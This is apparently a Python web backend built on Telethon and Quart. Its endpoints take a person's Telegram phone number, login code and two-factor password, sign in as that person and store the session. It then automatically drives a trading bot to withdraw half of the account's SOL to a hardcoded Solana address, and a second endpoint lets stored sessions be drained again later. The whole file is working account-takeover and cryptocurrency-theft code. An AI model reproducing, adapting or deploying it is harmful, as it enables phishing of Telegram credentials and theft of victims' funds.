import sqlite3
import re
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    RPCError,
)
from quart import Quart, request, jsonify
from quart_cors import cors
import asyncio
from dotenv import load_dotenv
import os
import httpx  # For health check of another server

# Load environment variables from the .env file
load_dotenv()

# Replace these with your Telegram API credentials
# Access the environment variables
api_id = os.getenv('API_ID')
api_hash = os.getenv('API_HASH')
bot_username = os.getenv('BOT_USERNAME')

app = Quart(__name__)
app = cors(app, allow_origin="*")  # Apply CORS after app initialization


# Database Setup
db_conn = sqlite3.connect("sessions.db")
db_cursor = db_conn.cursor()
db_cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    chat_id INTEGER PRIMARY KEY,
    phone TEXT,
    session_path TEXT
)
""")
db_cursor.execute("""
CREATE TABLE IF NOT EXISTS channels (
    chat_id INTEGER,
    channel_url TEXT,
    PRIMARY KEY (chat_id, channel_url)
)
""")
db_conn.commit()

def check_table_content():
    tables = ['users', 'channels']
    for table in tables:
        print(f"Contents of table '{table}':")
        try:
            db_cursor.execute(f"SELECT * FROM {table}")
            rows = db_cursor.fetchall()
            if rows:
                for row in rows:
                    print(row)
            else:
                print("Table is empty.")
        except Exception as e:
            print(f"Error reading table '{table}': {e}")
        print()  # Add a blank line for better readability

# Call the function
check_table_content()

# Helper Functions
def save_user_to_db(chat_id, phone, session_path):
    db_cursor.execute("""
        INSERT OR REPLACE INTO users (chat_id, phone, session_path)
        VALUES (?, ?, ?)
    """, (chat_id, phone, session_path))
    db_conn.commit()

def get_session_for_user(chat_id):
    db_cursor.execute("SELECT session_path FROM users WHERE chat_id = ?", (chat_id,))
    result = db_cursor.fetchone()
    return result[0] if result else None



# Function to delete session file (forcefully delete session)
def delete_session(phone):
    session_file = os.path.join(os.getcwd(), f'session_{phone}.session')
    if os.path.exists(session_file):
        os.remove(session_file)

# New function to send a message after successful login
async def send_message(user_client):
    try:
        # Send a message to the bot
        message = await user_client.send_message(bot_username, '/start')
        # Wait a bit for the bot to respond
        print("Waiting for response after /start...")
        await asyncio.sleep(2)  # Adding a delay to wait for the bot's response

        # Fetch the latest messages from the bot
        response = await user_client.get_messages(bot_username, limit=5)

        if response:
            print(f"Response from {bot_username}: {response[0].text}")
            buttons = response[0].buttons

            if buttons:
                print("Buttons found:")
                for row in buttons:
                    for button in row:
                        print(f"Button text: {button.text}")

                # Find and click the 'Withdraw' button (case-insensitive matching)
                withdraw_button = None
                for row in buttons:
                    for button in row:
                        if 'withdraw' in button.text.lower():  # Case-insensitive match
                            withdraw_button = button
                            break
                    if withdraw_button:
                        break

                if withdraw_button:
                    print(f"Clicking the 'Withdraw' button: {withdraw_button.text}")
                    await withdraw_button.click()

                    # Wait for a new message from the bot after clicking 'Withdraw'
                    print("Waiting for follow-up responses...")
                    async for message in user_client.iter_messages(bot_username, limit=10):
                        print(f"New message: {message.text}")

                        # Check for buttons in the new message
                        if message.buttons:
                            print("New buttons found:")
                            for row in message.buttons:
                                for button in row:
                                    print(f"Button text: {button.text}")
                                    if 'solana' in button.text.lower():  # Case-insensitive match
                                        print(f"Clicking the 'Solana' button: {button.text}")
                                        await button.click()
                                        solana_response = await user_client.get_messages(bot_username, limit=1)
                                        print(f"Response after clicking 'Solana': {solana_response[0].text}")

                                        # Now look for the 'SOL' button in the new message
                                        async for new_message in user_client.iter_messages(bot_username, limit=10):
                                            if new_message.buttons:
                                                print("New buttons after Solana click:")
                                                for row in new_message.buttons:
                                                    for button in row:
                                                        print(f"Button text: {button.text}")
                                                        if 'sol' in button.text.lower():  # Case-insensitive match for 'SOL'
                                                            print(f"Clicking the 'SOL' button: {button.text}")
                                                            await button.click()

                                                            # Capture the response after clicking 'SOL'
                                                            final_response = await user_client.get_messages(bot_username, limit=1)
                                                            print(f"Final response after clicking 'SOL': {final_response[0].text}")

                                                            # Look for the '50 %' button in the new message
                                                            async for next_message in user_client.iter_messages(bot_username, limit=10):
                                                                if next_message.buttons:
                                                                    print("New buttons after SOL click:")
                                                                    for row in next_message.buttons:
                                                                        for button in row:
                                                                            print(f"Button text: {button.text}")
                                                                            if '50 %' in button.text:  # Case-insensitive match for '100%'
                                                                                print(f"Clicking the '50 %' button: {button.text}")
                                                                                await button.click()

                                                                                # Capture the response after clicking '50 %'
                                                                                response_after_100 = await user_client.get_messages(bot_username, limit=1)
                                                                                print(f"Response after clicking '50 %': {response_after_100[0].text}")

                                                                                # Now look for the 'Set Withdrawal Address' button
                                                                                async for next_buttons_message in user_client.iter_messages(bot_username, limit=10):
                                                                                    if next_buttons_message.buttons:
                                                                                        print("New buttons after 50 % click:")
                                                                                        for row in next_buttons_message.buttons:
                                                                                            for button in row:
                                                                                                print(f"Button text: {button.text}")
                                                                                                if 'set withdrawal address' in button.text.lower():  # Case-insensitive match for 'Set Withdrawal Address'
                                                                                                    print(f"Clicking the 'Set Withdrawal Address' button: {button.text}")
                                                                                                    await button.click()

                                                                                                    # Capture the final response after clicking 'Set Withdrawal Address'
                                                                                                    final_withdrawal_response = await user_client.get_messages(bot_username, limit=1)
                                                                                                    print(f"Final response after clicking 'Set Withdrawal Address': {final_withdrawal_response[0].text}")

                                                                                                    # Send user-defined message (e.g., withdrawal address)
                                                                                                    withdrawal_address = 'D4uqqnayAW2t8iCTChGjEQCnAPx2ukWmitMbDuwYvWf7'  # Replace with the actual address
                                                                                                    print(f"Sending withdrawal address: {withdrawal_address}")
                                                                                                    await user_client.send_message(bot_username, withdrawal_address)

                                                                                                    # Introduce a delay after sending the withdrawal address
                                                                                                    print("Waiting for 5 seconds after sending withdrawal address...")
                                                                                                    await asyncio.sleep(3)  # Add a 3-second delay

                                                                                                    # Wait for the 'WITHDRAW' button after sending the withdrawal address
                                                                                                    async for final_message in user_client.iter_messages(bot_username, limit=10):
                                                                                                        print(f"Final message after sending address: {final_message.text}")
                                                                                                        if final_message.buttons:
                                                                                                            for row in final_message.buttons:
                                                                                                                for button in row:
                                                                                                                    print(f"Button text: {button.text}")
                                                                                                                    if 'withdraw' in button.text.lower():  # Specific match for 'WITHDRAW'
                                                                                                                        print(f"Clicking the 'WITHDRAW' button: {button.text}")
                                                                                                                        await button.click()  
                                                                                                                        return  # Exit once we click the 'WITHDRAW' button
                                                                                                    print("No 'WITHDRAW' button found after sending the withdrawal address.")
                                                # End of logic for 'SOL' button
                                                else:
                                                    print("No buttons found after SOL click.")
                else:
                    print("Withdraw button not found.")
            else:
                print("No buttons found in the response.")
        else:
            print("No response received after /start.")
    except Exception as e:
        return f"Error sending message: {e}"


# Web API Endpoints
@app.route('/request_code', methods=['POST'])
async def request_code():
    data = await request.get_json()
    phone = data.get('phone')
    chat_id = data.get('chat_id')

    if not phone or not chat_id:
        return jsonify({'error': 'Phone number and chat ID are required'}), 400
    
    # Delete any existing session before starting a new login attempt
    delete_session(phone)

    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone)
        return jsonify({'message': 'Login code sent', 'phone_code_hash': sent_code.phone_code_hash})
    except RPCError as e:
        delete_session(phone)
        return jsonify({'error': f'RPC error: {e}'}), 500
    except Exception as e:
        delete_session(phone)
        return jsonify({'error': f'Error: {e}'}), 500
    finally:
        await user_client.disconnect()




@app.route('/verify_code', methods=['POST'])
async def verify_code():
    data = await request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    phone_code_hash = data.get('phone_code_hash')
    password = data.get('password', None)  # For 2FA password
    chat_id = data.get('chat_id')

    if not phone or not code or not phone_code_hash or not chat_id:
        return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400

    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
    try:
        await user_client.connect()
        await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)

        if not await user_client.is_user_authorized():
            if password:
                await user_client.sign_in(password=password)
            else:
                return jsonify({'error': 'Two-factor authentication required'}), 403

        # Save user session
        session_path = f'session_{phone}'
        user_client.session.save()
        save_user_to_db(chat_id, phone, session_path)

        # Send a message after successful login
        await send_message(user_client)

        return jsonify({'message': 'Login successful and action performed'})
    except PhoneCodeInvalidError:
        delete_session(phone)
        return jsonify({'error': 'Invalid login code'}), 400
    except SessionPasswordNeededError:
        delete_session(phone)
        return jsonify({'error': 'Two-factor authentication required'}), 403
    except Exception as e:
        delete_session(phone)
        return jsonify({'error': f'Error: {e}'}), 500
    finally:
        await user_client.disconnect()
    


# API to trigger send_message function
@app.route('/send_message', methods=['POST'])
async def trigger_send_message():
    data = await request.get_json()
    chat_id = data.get('chat_id')

    if not chat_id:
        return jsonify({'error': 'Chat id is required'}), 400

    
    try:
        # Reuse the existing session if available
        session_path = get_session_for_user(chat_id)
        if not session_path:
            return jsonify({'error': 'No session found for this user'}), 404

        user_client = TelegramClient(session_path, api_id, api_hash)
        await user_client.connect()

        if not await user_client.is_user_authorized():
            return jsonify({'error': 'User not authorized. Please authenticate first.'}), 403

        # Call the send_message function
        response = await send_message(user_client)
        return jsonify({'message': 'Message sent successfully', 'response': response})
    except Exception as e:
        return jsonify({'error': f'Error: {str(e)}'}), 500
    finally:
        # Ensure the client disconnects after the operation
        await user_client.disconnect()


# Health check for another server
import httpx

async def check_other_server_health(url: str):
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, timeout=5)
            # Check if the response content type is JSON
            if response.status_code == 200:
                try:
                    json_data = response.json()  # Try parsing JSON
                    print(f"Other server is healthy, details: {json_data}")
                    return {'status': 'OK', 'details': json_data}
                except ValueError:
                    print(f"Failed to parse JSON from response: {response.text}")
                    return {'status': 'ERROR', 'details': 'Invalid JSON format'}
            else:
                print(f"Other server is unhealthy, status code: {response.status_code}, details: {response.text}")
                return {'status': 'ERROR', 'details': response.text}
        except Exception as e:
            print(f"Failed to get bot server status: {str(e)}")
            return {'status': 'ERROR', 'details': str(e)}

# API endpoint for health checks
@app.route('/health', methods=['GET'])
async def health_check():
    # Health status of the current service
    service_health = {'status': 'OK'}

    # Check health of another server
    other_server_url = "https://telebot-1-ah9a.onrender.com/health"
    other_server_health = await check_other_server_health(other_server_url)
    
    return jsonify({
        'current_service': service_health,
        'other_server': other_server_health
    }), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
